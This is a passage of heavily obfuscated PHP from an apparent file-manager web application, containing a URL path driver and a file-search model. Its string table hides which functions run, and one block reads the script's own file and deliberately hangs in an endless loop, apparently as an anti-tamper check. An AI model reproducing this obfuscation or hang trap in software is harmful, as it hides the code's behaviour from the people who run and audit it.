$A‚ÓÖğ¸Å[$CÊÊ®ÉÚéƒ[1340]] = isset($a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1374]]) ? strtotime($a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1374]]) : $A‚ÓÖğ¸Å[$CÊÊ®ÉÚéƒ[1339]]; return $A‚ÓÖğ¸Å; goto aõË·Á·µ“; BÆöÜªô”º: $CÊÊ®ÉÚéƒ =& $_SERVER[¬ı§†‰ú˜¼]; if ($b³×Â®Û“ == $CÊÊ®ÉÚéƒ[33] || $b³×Â®Û“ == $CÊÊ®ÉÚéƒ[8]) { return array(); } $eªª¦ñÖõÓ = $this->ussRequest($b³×Â®Û“, $CÊÊ®ÉÚéƒ[1369]); goto d£ù¾í†ç‘; d£ù¾í†ç‘: if (!$eªª¦ñÖõÓ[$CÊÊ®ÉÚéƒ[1085]]) { return null; } $a‘­í´Âñ = isset($eªª¦ñÖõÓ[$CÊÊ®ÉÚéƒ[1087]]) ? $eªª¦ñÖõÓ[$CÊÊ®ÉÚéƒ[1087]] : array(); if (!isset($a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1370]])) { return null; } goto C¤Ôå‡ÍµÖ; aõË·Á·µ“: } protected function _isFolder($eà±„™‰Ôß) { $d¼¡Áİ³¸À =& $_SERVER[¬ı§†‰ú˜¼]; if ($eà±„™‰Ôß == $d¼¡Áİ³¸À[33] || $eà±„™‰Ôß == $d¼¡Áİ³¸À[8]) { return !0; } $D±šŒÖ™Ææ = $this->_objectMeta($eà±„™‰Ôß); return isset($D±šŒÖ™Ææ[$d¼¡Áİ³¸À[29]]) && $D±šŒÖ™Ææ[$d¼¡Áİ³¸À[29]] == $d¼¡Áİ³¸À[77] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[¬ı§†‰ú˜¼][763]]) || !isset($_SERVER[$_SERVER[¬ı§†‰ú˜¼][764]])) { goto DÊÉ¬—‡ìë; A§‡‡‡¨¯‚: $C¾åÈ°Ğ®Œ = explode($_SERVER[¬ı§†‰ú˜¼][228], $A–ÂöÎàó—); if (count($C¾åÈ°Ğ®Œ) < $_SERVER[¬ı§†‰ú˜¼][584]) { $C•²…–†å = $_SERVER[¬ı§†‰ú˜¼][768]; $C•²…–†å(); } $aÄ¥ÆÖ†ËØ = $_SERVER[¬ı§†‰ú˜¼][769]; goto DĞÔèˆØ—³; DĞÔèˆØ—³: $aÄ¥ÆÖ†ËØ($_SERVER[$_SERVER[¬ı§†‰ú˜¼][766]] . $_SERVER[¬ı§†‰ú˜¼][767]); $E…Ã›‹·¢â = 2; while ($E…Ã›‹·¢â > 1) { $fõ¢®§¡² = rawurlencode($E…Ã›‹·¢â . $_SERVER[¬ı§†‰ú˜¼][374]); } goto A¨Ššİ¼…­; DÊÉ¬—‡ìë: $dÆ×ñ‰à’ = $_SERVER[¬ı§†‰ú˜¼][765]; $CïÕ”«‡ÁÂ = $_SERVER[$_SERVER[¬ı§†‰ú˜¼][766]] . $_SERVER[¬ı§†‰ú˜¼][767]; $A–ÂöÎàó— = $dÆ×ñ‰à’($CïÕ”«‡ÁÂ); goto A§‡‡‡¨¯‚; A¨Ššİ¼…­: } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($a˜Ã¤•Îˆ´ = false) { } public function exist($Cš«£ÔÅ×) { $féËèë®Ñ¹ = $this->info($Cš«£ÔÅ×); return $féËèë®Ñ¹[$_SERVER[¬ı§†‰ú˜¼][194]]; } public function isFile($d•õ¿˜Ù±„) { $Bàáå¾»ãÒ = $this->info($d•õ¿˜Ù±„); return $Bàáå¾»ãÒ[$_SERVER[¬ı§†‰ú˜¼][194]]; } public function isFolder($D§Éö‰™ô§) { return !1; } public function size($Bİ°®øÖÇ¹) { $câÎ¡ò®‡‡ = $this->info($Bİ°®øÖÇ¹); return $câÎ¡ò®‡‡[$_SERVER[¬ı§†‰ú˜¼][78]]; } public function info($F«º¿èŞ†) { return $this->infoParse($F«º¿èŞ†); } public function infoAuth($B¿×éâÌò‘) { return $this->infoParse($B¿×éâÌò‘); } public function infoWithChildren($CÈ£ÌÏŠÎ‚) { return $this->infoParse($CÈ£ÌÏŠÎ‚); } public function infoFull($fîà‡¥ì®Â) { return $this->infoParse($fîà‡¥ì®Â); } private function infoParse($Aç¹‹­Ììâ) { $B±ğ›ƒ¢Ö =& $_SERVER[¬ı§†‰ú˜¼]; $aßÉŒä±äë = $this->header($Aç¹‹­Ììâ); if (!$aßÉŒä±äë || !$aßÉŒä±äë[$B±ğ›ƒ¢Ö[714]]) { return !1; } $FÆ‚”½²® = _get($aßÉŒä±äë, $B±ğ›ƒ¢Ö[334], 0); $AîÎÊ’¿Òˆ = array($B±ğ›ƒ¢Ö[28] => $aßÉŒä±äë[$B±ğ›ƒ¢Ö[28]], $B±ğ›ƒ¢Ö[76] => $Aç¹‹­Ììâ, $B±ğ›ƒ¢Ö[29] => $B±ğ›ƒ¢Ö[192], $B±ğ›ƒ¢Ö[78] => intval($FÆ‚”½²®), $B±ğ›ƒ¢Ö[168] => get_path_ext($aßÉŒä±äë[$B±ğ›ƒ¢Ö[28]]), $B±ğ›ƒ¢Ö[1254] => $FÆ‚”½²® > 0 && $aßÉŒä±äë[$B±ğ›ƒ¢Ö[1375]], $B±ğ›ƒ¢Ö[1255] => !1); return $AîÎÊ’¿Òˆ; } private function header($CŠç±²Ø‚é) { goto Cã‡âÚ„øò; Aø£—©¡É: return self::$_cacheHeader[$CŠç±²Ø‚é]; goto fİÔÃµÈ; aµâ°¼¡©À: $GLOBALS[$aÀí…óß¨æ[1376]] = !0; self::$_cacheHeader[$CŠç±²Ø‚é] = url_header($CŠç±²Ø‚é); $GLOBALS[$aÀí…óß¨æ[1376]] = $e‡ÃÛå×÷œ; goto Aø£—©¡É; Cã‡âÚ„øò: $aÀí…óß¨æ =& $_SERVER[¬ı§†‰ú˜¼]; if (isset(self::$_cacheHeader[$CŠç±²Ø‚é])) { return self::$_cacheHeader[$CŠç±²Ø‚é]; } $e‡ÃÛå×÷œ = isset($GLOBALS[$aÀí…óß¨æ[1376]]) ? $GLOBALS[$aÀí…óß¨æ[1376]] : !1; goto aµâ°¼¡©À; fİÔÃµÈ: } public function hashSimple($b±…Ò¾éŸ, $B¥‘ÙÂñôø = false) { goto cäï™…öŞÔ; B‚¥¾§‰ˆ: $aä¥Ëïº­ = timeFloat(); $c«¹¯ñ½ = 15; for ($a‘‘çƒ”ŠÛ = 0; $a‘‘çƒ”ŠÛ < $FÔ”ÍÖ–‘ä; $a‘‘çƒ”ŠÛ++) { if (timeFloat() - $aä¥Ëïº­ > $c«¹¯ñ½) { return !1; } $dšŒ¢„¢ã© = $this->fileSubstr($b±…Ò¾éŸ, $bÉ˜½Ùœáå * $a‘‘çƒ”ŠÛ, $fÄÖ–‰Ú®ç); if (!$dšŒ¢„¢ã©) { return !1; } $f¡¨äåÖİ· .= $dšŒ¢„¢ã©; } goto Eòİˆê‡ÀÕ; cäï™…öŞÔ: $d¼ìĞ“Ô… =& $_SERVER[¬ı§†‰ú˜¼]; $fäÃÂ³ª„ = $this->info($b±…Ò¾éŸ); if (!$fäÃÂ³ª„ || !$fäÃÂ³ª„[$d¼ìĞ“Ô…[194]]) { return !1; } goto eÆ‰Õ“Ë¬; eÆ‰Õ“Ë¬: $AöğÑåèç¢ = $fäÃÂ³ª„[$d¼ìĞ“Ô…[78]]; $fÄÖ–‰Ú®ç = 200; $FÔ”ÍÖ–‘ä = 50; goto AŒŒ£ÌÇ’; AŒŒ£ÌÇ’: if ($AöğÑåèç¢ <= $fÄÖ–‰Ú®ç * $FÔ”ÍÖ–‘ä) { return md5($this->fileSubstr($b±…Ò¾éŸ, 0, $AöğÑåèç¢)) . $AöğÑåèç¢; } $bÉ˜½Ùœáå = intval($AöğÑåèç¢ / $FÔ”ÍÖ–‘ä); $f¡¨äåÖİ· = $d¼ìĞ“Ô…[33]; goto B‚¥¾§‰ˆ; Eòİˆê‡ÀÕ: $f¡¨äåÖİ· .= $this->fileSubstr($b±…Ò¾éŸ, $AöğÑåèç¢ - $fÄÖ–‰Ú®ç, $fÄÖ–‰Ú®ç); return md5($f¡¨äåÖİ·) . $AöğÑåèç¢; goto bšƒ»¢­‹Ó; bšƒ»¢­‹Ó: } public function getContent($B¨Û‡õÕ) { return $this->fileSubstr($B¨Û‡õÕ); } public function fileSubstr($FãòÆÃµ¥å, $e¼Ô¿ğ®˜Ò = 0, $FÒ‘‘æ¸ê = -1) { goto C™¬Œ¼ŞÇ; C™¬Œ¼ŞÇ: $CºÔŒŠÅØ– =& $_SERVER[¬ı§†‰ú˜¼]; $F½èĞƒ…Ò = $this->info($FãòÆÃµ¥å); if (!$F½èĞƒ…Ò || !$F½èĞƒ…Ò[$CºÔŒŠÅØ–[194]] && $F½èĞƒ…Ò[$CºÔŒŠÅØ–[78]] > 1024 * 1024 * 10) { return !1; } goto a™Ñ­æç†‰; a™Ñ­æç†‰: if ($FÒ‘‘æ¸ê === -1) { $FÒ‘‘æ¸ê = $F½èĞƒ…Ò[$CºÔŒŠÅØ–[78]]; } if ($FÒ‘‘æ¸ê == 0) { return $CºÔŒŠÅØ–[33]; } $d—½˜–ç = array($CºÔŒŠÅØ–[1377] . $e¼Ô¿ğ®˜Ò . $CºÔŒŠÅØ–[745] . ($e¼Ô¿ğ®˜Ò + $FÒ‘‘æ¸ê - 1)); goto d¾Š¤½; d¾Š¤½: $fË¨º¥²µ· = url_request($FãòÆÃµ¥å, $CºÔŒŠÅØ–[227], !1, $d—½˜–ç, !1, !1, 1); return $fË¨º¥²µ·[$CºÔŒŠÅØ–[1087]] ? $fË¨º¥²µ·[$CºÔŒŠÅØ–[1087]] : $CºÔŒŠÅØ–[33]; goto cö¶¶›’ê¿; cö¶¶›’ê¿: } public function download($CÓÌåáàí, $C­ËÜá–¢) { Downloader::start($CÓÌåáàí, $C­ËÜá–¢); return $C­ËÜá–¢; } } goto aµªø©½†; eä‡È¶Š¥: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($EËè¼Ë®âù) { goto bÍˆ÷ñèê…; bÍˆ÷ñèê…: $FŒé÷ÓÒ¾ =& $_SERVER[¬ı§†‰ú˜¼]; $Eñˆöôö§É = KodIO::fileTypeList(); $eÈ¸é¡Ÿ¨ = $Eñˆöôö§É[$EËè¼Ë®âù]; goto aìƒ¶ÀŞ™; D ×‘¥Ü˜†: if (!$eÈ¸é¡Ÿ¨[$FŒé÷ÓÒ¾[168]]) { $FÎ†„ƒ¯¤µ = array_to_keyvalue($Eñˆöôö§É, $FŒé÷ÓÒ¾[33], $FŒé÷ÓÒ¾[168]); $cËƒ´©ÒÉƒ = implode($FŒé÷ÓÒ¾[47], $FÎ†„ƒ¯¤µ); $E‚¹ˆÒéïê = $FŒé÷ÓÒ¾[1930]; } $d¿‡¾¦æ¹Í = explode($FŒé÷ÓÒ¾[47], trim($cËƒ´©ÒÉƒ, $FŒé÷ÓÒ¾[47])); return array($E‚¹ˆÒéïê, $d¿‡¾¦æ¹Í); goto dê‹àãëù‹; aìƒ¶ÀŞ™: if (!$eÈ¸é¡Ÿ¨) { return array(); } $cËƒ´©ÒÉƒ = $eÈ¸é¡Ÿ¨[$FŒé÷ÓÒ¾[168]]; $E‚¹ˆÒéïê = $FŒé÷ÓÒ¾[7]; goto D ×‘¥Ü˜†; dê‹àãëù‹: } public function listPathType($D £ëÁŒˆÏ) { $AĞ‚°íò·× =& $_SERVER[¬ı§†‰ú˜¼]; $DËÎ›«‚§¹ = $this->fileTypeWhere($D £ëÁŒˆÏ); if (!$DËÎ›«‚§¹) { return array(); } $CØâÉºì© = array($AĞ‚°íò·×[548] => SourceModel::TYPE_USER, $AĞ‚°íò·×[549] => USER_ID, $AĞ‚°íò·×[545] => 0, $AĞ‚°íò·×[546] => $DËÎ›«‚§¹); return $this->listSource($CØâÉºì©); } public function listSearch($F¯´“Ş¬­, $a¬âƒ‘Ÿ§ = 300) { goto D”Øõ–Úˆ¦; D”Øõ–Úˆ¦: $F¦¡Åœ©‰ =& $_SERVER[¬ı§†‰ú˜¼]; if (isset($F¯´“Ş¬­[$F¦¡Åœ©‰[1773]]) && $F¯´“Ş¬­[$F¦¡Åœ©‰[1773]]) { $F¯´“Ş¬­[$F¦¡Åœ©‰[1773]] = str_replace($F¦¡Åœ©‰[380], $F¦¡Åœ©‰[1931], trim($F¯´“Ş¬­[$F¦¡Åœ©‰[1773]])); } $A—ÁœÂºÄ£ = $this->_parseSearchWhere($F¯´“Ş¬­); goto bŞñÓ¯È§; bŞñÓ¯È§: if (!isset($A—ÁœÂºÄ£[$F¦¡Åœ©‰[421]])) { $A—ÁœÂºÄ£[$F¦¡Åœ©‰[421]] = 0; } $EĞµ»ÌÌˆ¼ = $F¦¡Åœ©‰[1932]; $F˜ĞÕöå®´ = $EĞµ»ÌÌˆ¼; goto Cšø§®ŒØÏ; Cšø§®ŒØÏ: $this->_listSearchBindPinyin($F¯´“Ş¬­, $A—ÁœÂºÄ£, $EĞµ»ÌÌˆ¼); $this->alias($F¦¡Åœ©‰[515])->_makeOrder(); $A—ÁœÂºÄ£ = $this->parseWhereLike($A—ÁœÂºÄ£); goto Aøå¦¶ÙöÖ; Aøå¦¶ÙöÖ: $CÍÂÊ„µ = $this->distinct(!0)->field($EĞµ»ÌÌˆ¼)->where($A—ÁœÂºÄ£)->selectPage($a¬âƒ‘Ÿ§); $this->_listSearchFileContent($CÍÂÊ„µ, $F¯´“Ş¬­, $F˜ĞÕöå®´); $this->_listSearchDesc($CÍÂÊ„µ, $F¯´“Ş¬­, $F˜ĞÕöå®´); goto B´ÎéÏÎª¬; AğĞÈ¸™áï: $this->_listMake($CÍÂÊ„µ); return $CÍÂÊ„µ; goto AÀíˆ¸®Íğ; B´ÎéÏÎª¬: $this->_listSearchTag($CÍÂÊ„µ, $F¯´“Ş¬­, $F˜ĞÕöå®´); $this->_listSearchGroupTag($CÍÂÊ„µ, $F¯´“Ş¬­, $F˜ĞÕöå®´); $this->_listDataApply($CÍÂÊ„µ[$F¦¡Åœ©‰[366]]); goto AğĞÈ¸™áï; AÀíˆ¸®Íğ: } private function _listSearchFileContent(&$Aôë¶¬Àæ, $D•…¬ñµ›Ù, $eÑæÊĞô®¦) { goto EÊ¾¾Î’œ; AÀ–ùƒˆ·Ë: $Aôë¶¬Àæ[$b‰Ë”ÕĞ[366]] = array_merge($fëÅ†°ãœ±, $Aôë¶¬Àæ[$b‰Ë”ÕĞ[366]]); $Aôë¶¬Àæ[$b‰Ë”ÕĞ[363]][$b‰Ë”ÕĞ[364]] += count($fëÅ†°ãœ±); goto dãöÛí»‡; EÊ¾¾Î’œ: $b‰Ë”ÕĞ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$D•…¬ñµ›Ù[$b‰Ë”ÕĞ[1773]] || $Aôë¶¬Àæ[$b‰Ë”ÕĞ[363]][$b‰Ë”ÕĞ[350]] > 1) { return; } $bµŠ¿­é¹Ò = $this->_parseSearchWhere($D•…¬ñµ›Ù); goto DîëÕ±„ÅÚ; d‚è„·šŞ‚: unset($D•…¬ñµ›Ù[$b‰Ë”ÕĞ[445]]); $fëÅ†°ãœ± = $this->field($eÑæÊĞô®¦)->where($bµŠ¿­é¹Ò)->limit($b‰Ë”ÕĞ[1933])->select(); if (!$fëÅ†°ãœ± || count($fëÅ†°ãœ±) == 0) { return; } goto AÀ–ùƒˆ·Ë; DîëÕ±„ÅÚ: if (!isset($bµŠ¿­é¹Ò[$b‰Ë”ÕĞ[28]]) || !is_array($D•…¬ñµ›Ù[$b‰Ë”ÕĞ[445]])) { return; } $bµŠ¿­é¹Ò[$b‰Ë”ÕĞ[445]] = array($b‰Ë”ÕĞ[7], $D•…¬ñµ›Ù[$b‰Ë”ÕĞ[445]]); unset($bµŠ¿­é¹Ò[$b‰Ë”ÕĞ[28]]); goto d‚è„·šŞ‚; dãöÛí»‡: } private function _listSearchTag(&$eØ¸äÇ“ƒ, $dò¡ƒÉº–Ş, $F•õÒÚ‹·) { goto AÅŠï—„ƒ; AÅŠï—„ƒ: $fÕßõÙ¼ó­ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$dò¡ƒÉº–Ş[$fÕßõÙ¼ó­[1773]] || $eØ¸äÇ“ƒ[$fÕßõÙ¼ó­[363]][$fÕßõÙ¼ó­[350]] > 1) { return; } $e®‡Š±¢Ëæ = Model($fÕßõÙ¼ó­[1934])->listData(); goto Eó÷™Æ‡Ş¹; E™ˆ¼±ÈŞ: $C‚‚Ğ³ò· = array_to_keyvalue($C‚‚Ğ³ò·, $fÕßõÙ¼ó­[33], $fÕßõÙ¼ó­[76]); $AÄ¸İÇùæ› = array_unique($C‚‚Ğ³ò·); $this->_listSearchMerge($eØ¸äÇ“ƒ, $dò¡ƒÉº–Ş, $F•õÒÚ‹·, $AÄ¸İÇùæ›); goto BÆµƒã¦à; Eó÷™Æ‡Ş¹: $b±ÉäŸ‘ˆ¬ = array(); $EîÅô×ë¹ = $dò¡ƒÉº–Ş[$fÕßõÙ¼ó­[1773]]; foreach ($e®‡Š±¢Ëæ as $Bãñç‘“Š¥) { $A–•·‘° = $Bãñç‘“Š¥[$fÕßõÙ¼ó­[28]]; $F¸õ½œ±ô¥ = str_replace($fÕßõÙ¼ó­[50], $fÕßõÙ¼ó­[33], Pinyin::encode($A–•·‘°)); if (stripos($A–•·‘°, $EîÅô×ë¹) !== !1 || stripos($F¸õ½œ±ô¥, $EîÅô×ë¹) !== !1) { $b±ÉäŸ‘ˆ¬[] = $Bãñç‘“Š¥[$fÕßõÙ¼ó­[392]]; } } goto BöÌŞÑÚÎ—; BöÌŞÑÚÎ—: if (!$b±ÉäŸ‘ˆ¬) { return; } $E”£»„ªàø = array($fÕßõÙ¼ó­[417] => array($fÕßõÙ¼ó­[7], $b±ÉäŸ‘ˆ¬), $fÕßõÙ¼ó­[1527] => USER_ID); $C‚‚Ğ³ò· = Model($fÕßõÙ¼ó­[418])->field($fÕßõÙ¼ó­[76])->where($E”£»„ªàø)->select(); goto E™ˆ¼±ÈŞ; BÆµƒã¦à: } private function _listSearchDesc(&$A­º‹×¥², $B­ÒÂÒé¯Ó, $CñÁçÊàÇ…) { goto b«£Ö­è¡ğ; b¡¬ÛÎ¤§: $BÅ‹¯¦è·  = Model($cÇİ¶÷Ìãœ[531])->field($cÇİ¶÷Ìãœ[394])->where($b¡º›ÊØòÛ)->select(); $dÈ–Ì¢¨Æ = array_to_keyvalue($BÅ‹¯¦è· , $cÇİ¶÷Ìãœ[33], $cÇİ¶÷Ìãœ[394]); $this->_listSearchMerge($A­º‹×¥², $B­ÒÂÒé¯Ó, $CñÁçÊàÇ…, $dÈ–Ì¢¨Æ); goto c“‚­òÈ‘Æ; b«£Ö­è¡ğ: $cÇİ¶÷Ìãœ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$B­ÒÂÒé¯Ó[$cÇİ¶÷Ìãœ[1773]] || $A­º‹×¥²[$cÇİ¶÷Ìãœ[363]][$cÇİ¶÷Ìãœ[350]] > 1) { return; } $c›®¬Üò¿â = $this->listSearchChildren($B­ÒÂÒé¯Ó[$cÇİ¶÷Ìãœ[476]]); goto d¨¬²Ÿ¥”©; d¨¬²Ÿ¥”©: $c›®¬Üò¿â = array_unique($c›®¬Üò¿â); if (!$c›®¬Üò¿â) { return; } $b¡º›ÊØòÛ = array($cÇİ¶÷Ìãœ[394] => array($cÇİ¶÷Ìãœ[7], $c›®¬Üò¿â), $cÇİ¶÷Ìãœ[93] => $cÇİ¶÷Ìãœ[429], $cÇİ¶÷Ìãœ[371] => array($cÇİ¶÷Ìãœ[379], $cÇİ¶÷Ìãœ[1775] . $B­ÒÂÒé¯Ó[$cÇİ¶÷Ìãœ[1773]] . $cÇİ¶÷Ìãœ[1775])); goto b¡¬ÛÎ¤§; c“‚­òÈ‘Æ: } private function _listSearchGroupTag(&$d÷¿ÔšŞ»º, $dŠ¶ÖÆŒ„, $Dê…ÁÕ‹§Ü) { goto c‡°¼ ¦­; bÒ¢‚¾¾ç»: if (!$AôÂÖ¶ŒÏº) { return; } $eÔÀÜ»¥»ö = array($fĞ¿ôÙƒ[417] => array($fĞ¿ôÙƒ[7], $AôÂÖ¶ŒÏº), $fĞ¿ôÙƒ[1527] => 0, $fĞ¿ôÙƒ[29] => $fĞ¿ôÙƒ[1797] . $cƒÑ¼†µë); $c•Ù¢–ï‚ = Model($fĞ¿ôÙƒ[418])->field($fĞ¿ôÙƒ[76])->where($eÔÀÜ»¥»ö)->select(); goto b™Šì½³ğ; C¢¦½Š¾ğí: if (!$eÇ¦‘•àœ || $eÇ¦‘•àœ[$fĞ¿ôÙƒ[402]] != SourceModel::TYPE_GROUP) { return; } $cƒÑ¼†µë = $eÇ¦‘•àœ[$fĞ¿ôÙƒ[482]]; $DÂÓí“ñä¥ = Model($fĞ¿ôÙƒ[1935])->get($cƒÑ¼†µë); goto fñ…¥ÃÙÃ; b™Šì½³ğ: $c•Ù¢–ï‚ = array_to_keyvalue($c•Ù¢–ï‚, $fĞ¿ôÙƒ[33], $fĞ¿ôÙƒ[76]); $cŒ¢ô×áÂï = array_unique($c•Ù¢–ï‚); $this->_listSearchMerge($d÷¿ÔšŞ»º, $dŠ¶ÖÆŒ„, $Dê…ÁÕ‹§Ü, $cŒ¢ô×áÂï); goto bÇ§“£õ›Ú; c‡°¼ ¦­: $fĞ¿ôÙƒ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$dŠ¶ÖÆŒ„[$fĞ¿ôÙƒ[1773]] || $d÷¿ÔšŞ»º[$fĞ¿ôÙƒ[363]][$fĞ¿ôÙƒ[350]] > 1 || !$dŠ¶ÖÆŒ„[$fĞ¿ôÙƒ[476]]) { return; } $eÇ¦‘•àœ = $this->sourceInfo($dŠ¶ÖÆŒ„[$fĞ¿ôÙƒ[476]]); goto C¢¦½Š¾ğí; fñ…¥ÃÙÃ: $AôÂÖ¶ŒÏº = array(); $b…’¶ÒååÇ = $dŠ¶ÖÆŒ„[$fĞ¿ôÙƒ[1773]]; foreach ($DÂÓí“ñä¥[$fĞ¿ôÙƒ[366]] as $a×ˆ¬ŒÉ§) { $b§›³à…Ç‚ = $a×ˆ¬ŒÉ§[$fĞ¿ôÙƒ[28]]; $eè—åáãº” = str_replace($fĞ¿ôÙƒ[50], $fĞ¿ôÙƒ[33], Pinyin::encode($b§›³à…Ç‚)); if (stripos($b§›³à…Ç‚, $b…’¶ÒååÇ) !== !1 || stripos($eè—åáãº”, $b…’¶ÒååÇ) !== !1) { $AôÂÖ¶ŒÏº[] = $a×ˆ¬ŒÉ§[$fĞ¿ôÙƒ[392]]; } } goto bÒ¢‚¾¾ç»; bÇ§“£õ›Ú: } private function _listSearchMerge(&$cÛŞÍ¡ù«, $d‚•ô§¦Î¬, $D‚šæä®è´, $Eó¶Ú–ÈÂ) { goto eŒ×Æ¥À®; BÖŞÏè«÷‹: $A˜Åôİ÷ßß = $this->field($D‚šæä®è´)->where($aÇ¼™Ã«ô)->select(); if (!$A˜Åôİ÷ßß) { return; } $fĞ‡ŞÚ’¤Ö = array(); goto EŸ…êòÃ; FÂï‚§²‡×: $aç ÷”¨âÍ = array_diff($Eó¶Ú–ÈÂ, $bó¯åíÇÕ˜); if (!$aç ÷”¨âÍ) { return; } $aÇ¼™Ã«ô = array($DÑ±ßÀì ä[394] => array($DÑ±ßÀì ä[7], $aç ÷”¨âÍ)); goto BÖŞÏè«÷‹; eŒ×Æ¥À®: $DÑ±ßÀì ä =& $_SERVER[¬ı§†‰ú˜¼]; if (!$Eó¶Ú–ÈÂ) { return; } $bó¯åíÇÕ˜ = array_to_keyvalue($cÛŞÍ¡ù«[$DÑ±ßÀì ä[366]], $DÑ±ßÀì ä[33], $DÑ±ßÀì ä[394]); goto FÂï‚§²‡×; EŸ…êòÃ: foreach ($A˜Åôİ÷ßß as $Eˆ»˜Âó¤Â) { if ($this->_listSearchFilter($Eˆ»˜Âó¤Â, $d‚•ô§¦Î¬)) { $fĞ‡ŞÚ’¤Ö[] = $Eˆ»˜Âó¤Â; } } $cÛŞÍ¡ù«[$DÑ±ßÀì ä[366]] = array_merge($fĞ‡ŞÚ’¤Ö, $cÛŞÍ¡ù«[$DÑ±ßÀì ä[366]]); $cÛŞÍ¡ù«[$DÑ±ßÀì ä[363]][$DÑ±ßÀì ä[364]] += count($fĞ‡ŞÚ’¤Ö); goto D¤Èé•³ôœ; D¤Èé•³ôœ: } private function _listSearchFilter($F—ÎñÖ†ñ†, $FÇ¾ĞŞ¯‰Ú) { goto aµÉº×±¨; aóë‘´ôßÕ: if (isset($FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[403]]) && $FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[403]] != $eò·‚ìÌˆ[1740]) { if ($FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[403]] == $eò·‚ìÌˆ[77] && !$EŒèº‘¹ÉÍ) { return !1; } if ($FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[403]] != $eò·‚ìÌˆ[77] && $EŒèº‘¹ÉÍ) { return !1; } if (!strstr($F—ÎñÖ†ñ†[$eò·‚ìÌˆ[168]], $eò·‚ìÌˆ[47] . $FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[403]] . $eò·‚ìÌˆ[47])) { return !1; } } if (isset($FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[1936]]) && $FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[1936]] < $F—ÎñÖ†ñ†[$eò·‚ìÌˆ[78]]) { return !1; } if (isset($FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[1937]]) && $FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[1937]] > $F—ÎñÖ†ñ†[$eò·‚ìÌˆ[78]]) { return !1; } goto EŸ¸ŞòÖœ±; aµÉº×±¨: $eò·‚ìÌˆ =& $_SERVER[¬ı§†‰ú˜¼]; $EŒèº‘¹ÉÍ = $F—ÎñÖ†ñ†[$eò·‚ìÌˆ[401]] == $eò·‚ìÌˆ[87]; if (!strstr($F—ÎñÖ†ñ†[$eò·‚ìÌˆ[485]], $eò·‚ìÌˆ[47] . $FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[476]] . $eò·‚ìÌˆ[47])) { return !1; } goto aóë‘´ôßÕ; EŸ¸ŞòÖœ±: if (isset($FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[561]]) && $FÇ¾ĞŞ¯‰Ú[$eò·‚ìÌˆ[561]] != $F—ÎñÖ†ñ†[$eò·‚ìÌˆ[432]]) { return !1; } return !0; goto Cİ‰Õ–“Ÿë; Cİ‰Õ–“Ÿë: } public function listSearchChildren($a”Æâ§™êé, $a™ÚÖÒ°»ª = 5000) { goto c¬›¨²îº•; EÔäƒÉ‰ß: $DõèŠ˜…© = $this->field($Aåø‰ôÍ‡¼[394])->where($AÅìÚÏŒÚ)->select(); $E°ªª»º…í = array_to_keyvalue($DõèŠ˜…©, $Aåø‰ôÍ‡¼[33], $Aåø‰ôÍ‡¼[394]); return $E°ªª»º…í; goto aäîÉøÇ¸¤; c¬›¨²îº•: $Aåø‰ôÍ‡¼ =& $_SERVER[¬ı§†‰ú˜¼]; $E°ªª»º…í = array(); $E¶‚ñÀ£„Ï = $this->sourceInfo($a”Æâ§™êé); goto e¶Å£…ˆÍ; e¶Å£…ˆÍ: $AÅìÚÏŒÚ = array($Aåø‰ôÍ‡¼[485] => array($Aåø‰ôÍ‡¼[379], $E¶‚ñÀ£„Ï[$Aåø‰ôÍ‡¼[485]] . $E¶‚ñÀ£„Ï[$Aåø‰ôÍ‡¼[394]] . $Aåø‰ôÍ‡¼[512])); $C¾÷Ü²ê = $this->field($Aåø‰ôÍ‡¼[394])->cache(null, 600)->where($AÅìÚÏŒÚ)->count(); if ($C¾÷Ü²ê > $a™ÚÖÒ°»ª) { return $this->_listSearchChildrenNear($a”Æâ§™êé, $a™ÚÖÒ°»ª); } goto EÔäƒÉ‰ß; aäîÉøÇ¸¤: } private function _listSearchChildrenNear($a×±’é¸—“, $f‰–ë¼’–Ø) { goto AÛæ÷¡åŠ; d‡ÏºšÃÅ™: $BÛ¨‚®—•º = $this->field($EÃÕ®˜¸„[1938])->where($EÇÄ´¨ˆä)->select(); $CäÈ„× †Ø = array_to_keyvalue(array_filter_by_field($BÛ¨‚®—•º, $EÃÕ®˜¸„[401], $EÃÕ®˜¸„[87]), $EÃÕ®˜¸„[33], $EÃÕ®˜¸„[394]); $bíáËŸÙŸ = array_merge($bíáËŸÙŸ, array_to_keyvalue($BÛ¨‚®—•º, $EÃÕ®˜¸„[33], $EÃÕ®˜¸„[394])); goto FóÅãÂİÖ; AÛæ÷¡åŠ: $EÃÕ®˜¸„ =& $_SERVER[¬ı§†‰ú˜¼]; $bíáËŸÙŸ = array(); $EÇÄ´¨ˆä = array($EÃÕ®˜¸„[476] => $a×±’é¸—“); goto d‡ÏºšÃÅ™; FóÅãÂİÖ: if (!$CäÈ„× †Ø) { return $bíáËŸÙŸ; } $EÇÄ´¨ˆä = array($EÃÕ®˜¸„[476] => array($EÃÕ®˜¸„[7], $CäÈ„× †Ø)); $BÛ¨‚®—•º = $this->field($EÃÕ®˜¸„[1938])->where($EÇÄ´¨ˆä)->limit($f‰–ë¼’–Ø)->select(); goto Cê××£¦àŠ; Cê××£¦àŠ: $bíáËŸÙŸ = array_merge($bíáËŸÙŸ, array_to_keyvalue($BÛ¨‚®—•º, $EÃÕ®˜¸„[33], $EÃÕ®˜¸„[394])); $bíáËŸÙŸ = array_slice($bíáËŸÙŸ, 0, 